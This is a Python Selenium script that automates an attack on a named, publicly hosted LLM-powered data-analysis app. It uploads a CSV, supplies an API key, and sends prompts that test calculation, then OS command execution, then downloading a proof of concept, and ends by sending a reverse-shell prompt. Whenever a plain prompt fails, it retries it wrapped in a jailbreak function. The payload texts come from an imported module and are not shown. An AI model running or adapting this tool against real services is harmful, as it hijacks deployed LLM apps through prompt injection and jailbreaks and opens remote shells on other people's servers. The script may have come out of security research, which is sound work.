import json
import time
from prompt import *
from time import sleep
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains

log_red = lambda x: print(f"\033[31m{x}\33[0m")
log_yellow = lambda x: print(f"\033[33m{x}\33[0m")
log_blue = lambda x: print(f"\033[34m{x}\33[0m")

class AutoTest:
    def __init__(self, url, api_key, debug=False):
        self.url = url
        self.api_key = api_key
        self.driver = webdriver.Chrome()
        self.debug = debug

    def initialize(self):
        # driver.implicitly_wait(20)
        self.driver.get(url)
        sleep(10)

        # upload file
        self.driver.switch_to.frame(self.driver.find_elements(By.TAG_NAME,'iframe')[0])
        self.driver.find_element(By.XPATH, "//input[@type='file']").send_keys("/xxxx/sample_data.csv")
        sleep(5)

        # click to choose other
        select_container = self.driver.find_element(By.CLASS_NAME, "st-be")
        select_container.click()
        sleep(3)

        # select other
        action = ActionChains(self.driver)
        action.send_keys(Keys.ARROW_DOWN)
        action.send_keys(Keys.ARROW_DOWN)
        action.send_keys(Keys.ARROW_DOWN)
        action.send_keys(Keys.ENTER)
        action.perform()
        sleep(3)

        # enter the api key
        self.driver.find_element(By.XPATH, "//input[@type='password']").send_keys(self.api_key)

    def get_response(self):
        html_source = self.driver.page_source
        soup = BeautifulSoup(html_source, "html.parser")
        response = soup.prettify()
        if self.debug:
            print(response)
        return response

    def enter_prompt(self, prompt):
        # enter the prompt
        log_red(f"[+] Current prompt: {prompt}")
        el = self.driver.find_element(By.XPATH, "//input[@type='text']")
        el.clear()
        el.send_keys(prompt)
        el.send_keys(Keys.ENTER)
        sleep(7)
     
    def quit(self):
        self.driver.quit()


if __name__ == "__main__":
    start = time.time()
    url = "https://askdataframe.streamlit.app/"
    api_key = "XXXX"
    test = AutoTest(url, api_key)
    test.initialize()
    # test calculation and print
    test.enter_prompt(basic_calc)
    res = test.get_response()
    if "7777844444443" not in res:
        raise ValueError("Cannot do calculation or cannot generate code")
    log_yellow("[*] Pass the calculation & print test!")

    # test calculation of hash
    test.enter_prompt(calc_hash)
    res = test.get_response()
    expected = "e5eb783b99940e3f82f92910d2cf1bfc04dd579233cc72222f39c2c6b132014b"
    if expected not in res:
        log_blue("[!] Hash cannot be calculated by simple prompt!")
        test.enter_prompt(to_jailbreak_0(calc_hash))
        res = test.get_response()
        if expected not in res:
            raise ValueError("Cannot do calculation hash! fake!")
    log_yellow("[*] Pass the hash calculation test!")

    # test import os cmd
    test.enter_prompt(cmd_echo)
    res = test.get_response()
    expected = "fheusfhudis62781"
    if expected not in res:
        log_blue("[!] echo arbitrary str cannot be done by simple prompt!")
        test.enter_prompt(to_jailbreak_0(cmd_echo))
        res = test.get_response()
        if expected not in res:
            raise ValueError("Cannot execute cmd! fake!")
    log_yellow("[*] Pass the cmd test!")

    # maybe here is a cmd_curl test

    # test poc download
    test.enter_prompt(download_poc)
    res = test.get_response()
    expected = "dhuiagdyeui222"
    if expected not in res:
        log_blue("[!] poc cannot be downloaded by simple prompt!")
        test.enter_prompt(to_jailbreak_0(download_poc))
        res = test.get_response()
        if expected not in res:
            raise ValueError("Cannot download poc!")
    log_yellow("[*] Pass the poc download test!")

    # time to reverse the shell!
    test.enter_prompt(reverse_shell)
    test.quit()
    end = time.time()
    print(f"[+] Total time costs: {end-start}")